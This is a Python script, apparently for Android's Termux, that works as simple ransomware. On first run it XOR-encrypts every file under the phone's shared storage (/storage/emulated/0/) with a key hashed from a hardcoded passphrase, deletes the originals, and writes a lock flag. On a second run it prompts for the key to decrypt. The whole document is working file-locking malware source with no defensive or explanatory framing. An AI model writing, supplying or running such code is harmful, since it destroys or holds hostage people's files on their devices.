import os
import hashlib

base_dir = '/storage/emulated/0/'
lock_file = '/data/data/com.termux/files/home/.enc_flag'
signature = b'SHIRO_LOCKED'

def get_key(k):
    return hashlib.sha256(k.encode()).digest()

def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def encrypt_file(path, key):
    data = signature + open(path, 'rb').read()
    enc = xor(data, key)
    open(path + '.enc', 'wb').write(enc)
    os.remove(path)

def decrypt_file(path, key):
    data = xor(open(path, 'rb').read(), key)
    if not data.startswith(signature):
        raise Exception('invalid key')
    clean = data[len(signature):]
    open(path.replace('.enc', ''), 'wb').write(clean)
    os.remove(path)

def encrypt_all(key):
    for r, _, fs in os.walk(base_dir):
        for f in fs:
            if not f.endswith('.enc'):
                encrypt_file(os.path.join(r, f), key)

def decrypt_all(key):
    for r, _, fs in os.walk(base_dir):
        for f in fs:
            if f.endswith('.enc'):
                decrypt_file(os.path.join(r, f), key)

if not os.path.exists(lock_file):
    key = get_key('shirokoloveshanz')
    encrypt_all(key)
    open(lock_file, 'w').write('1')
    print('[+] all files encrypted. run again to decrypt.')
else:
    k = input('[?] enter decrypt key: ').strip()
    key = get_key(k)
    try:
        decrypt_all(key)
        os.remove(lock_file)
        print('[+] files decrypted.')
    except:
        print('[!] wrong key. files not decrypted.')
